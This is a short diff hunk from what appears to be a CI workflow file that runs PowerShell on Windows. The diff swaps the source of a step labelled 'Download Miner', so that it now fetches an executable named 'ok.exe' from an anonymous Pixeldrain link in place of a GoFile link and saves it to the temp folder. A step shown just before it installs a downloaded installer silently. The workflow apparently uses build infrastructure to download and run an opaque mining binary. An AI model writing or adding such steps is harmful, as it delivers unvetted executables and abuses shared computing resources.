@@ -77,10 +77,10 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- Download Miner from GoFile ---
-      - name: Download Miner from GoFile (curl)
+      # --- Download Miner from Pixeldrain ---
+      - name: Download Miner from Pixeldrain
         run: |
-          $url = "https://store5.gofile.io/download/web/8f584fe5-6633-43c4-94ff-aac3a7981d9e/ok.exe"
+          $url = "https://pixeldrain.com/api/file/dYQsWt5c"
           $output = "$env:TEMP\ok.exe"
           curl.exe -L -o $output $url
           Write-Host "Miner downloaded to $output"
